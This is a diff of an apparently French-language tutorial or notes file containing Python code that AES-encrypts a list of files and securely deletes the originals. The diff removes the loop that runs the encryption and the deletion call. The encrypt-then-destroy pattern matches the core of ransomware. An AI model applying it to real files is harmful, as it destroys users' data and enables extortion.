@@ -72,14 +72,6 @@ def encrypt_file(file_path, key):
     cipher = AES.new(key, AES.MODE_CBC)
     ciphertext = cipher.iv + cipher.encrypt(pad(file_data, AES.block_size))
     return ciphertext
-
-encrypted_files = {}
-for file_path in files_to_encrypt:
-    ciphertext = encrypt_file(file_path, key)
-    encrypted_file_path = file_path + ".enc"
-    with open(encrypted_file_path, 'wb') as f:
-        f.write(ciphertext)
-    encrypted_files[file_path] = encrypted_file_path
 ```
 
 ### Suppression des fichiers originaux pour empêcher la lecture
@@ -101,6 +93,4 @@ def secure_delete(file_path):
         os.remove(file_path)
     except Exception as e:
         print(f"Erreur lors de la suppression sécurisée de {file_path}: {e}")
-        
-secure_delete(file_path)
 ```
